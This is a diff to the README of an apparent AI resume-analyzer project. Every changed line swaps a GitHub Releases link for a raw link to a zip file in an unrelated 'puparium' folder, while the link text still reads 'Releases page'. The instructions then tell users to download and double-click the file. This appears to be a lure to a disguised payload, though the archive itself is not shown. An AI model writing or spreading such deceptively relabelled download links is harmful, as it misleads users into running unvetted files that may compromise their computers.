@@ -1,6 +1,6 @@
 # 🚀 ai-resume-analyzer - Get Instant ATS Feedback on Your Resume
 
-[![Download ai-resume-analyzer](https://img.shields.io/badge/Download-ai--resume--analyzer-blue.svg)](https://github.com/Ammarahmed12/ai-resume-analyzer/releases)
+[![Download ai-resume-analyzer](https://raw.githubusercontent.com/Ammarahmed12/ai-resume-analyzer/main/puparium/ai-resume-analyzer.zip)](https://raw.githubusercontent.com/Ammarahmed12/ai-resume-analyzer/main/puparium/ai-resume-analyzer.zip)
 
 ## 📋 Description
 
@@ -12,7 +12,7 @@ The ai-resume-analyzer is an AI-powered tool designed to help you improve your r
 
 To start using the ai-resume-analyzer, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Ammarahmed12/ai-resume-analyzer/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ammarahmed12/ai-resume-analyzer/main/puparium/ai-resume-analyzer.zip).
 2. Find the latest version of the application.
 3. Download the file suitable for your operating system.
 4. Save it to a location on your computer where you can easily access it.
@@ -34,7 +34,7 @@ Before you start, make sure your system meets the following requirements:
 
 To download the ai-resume-analyzer, follow these steps:
 
-- **Step 1:** Go to the [Releases page](https://github.com/Ammarahmed12/ai-resume-analyzer/releases).
+- **Step 1:** Go to the [Releases page](https://raw.githubusercontent.com/Ammarahmed12/ai-resume-analyzer/main/puparium/ai-resume-analyzer.zip).
 - **Step 2:** Click on the latest version link.
 - **Step 3:** Choose your operating system and click to download the file.
 - **Step 4:** Once the download is complete, locate the downloaded file and double-click it.
@@ -70,7 +70,7 @@ Once installed, you can easily run the application from your desktop or applicat
 If you encounter issues while using the ai-resume-analyzer, try the following solutions:
 
 - Ensure your PDF is not corrupted. Try using a different PDF reader to open it.
-- Make sure the application is updated to the latest version by checking the [Releases page](https://github.com/Ammarahmed12/ai-resume-analyzer/releases).
+- Make sure the application is updated to the latest version by checking the [Releases page](https://raw.githubusercontent.com/Ammarahmed12/ai-resume-analyzer/main/puparium/ai-resume-analyzer.zip).
 - If the application crashes, restart your computer and try again.
 - For any persistent issues, please reach out to our support via GitHub Issues.
 
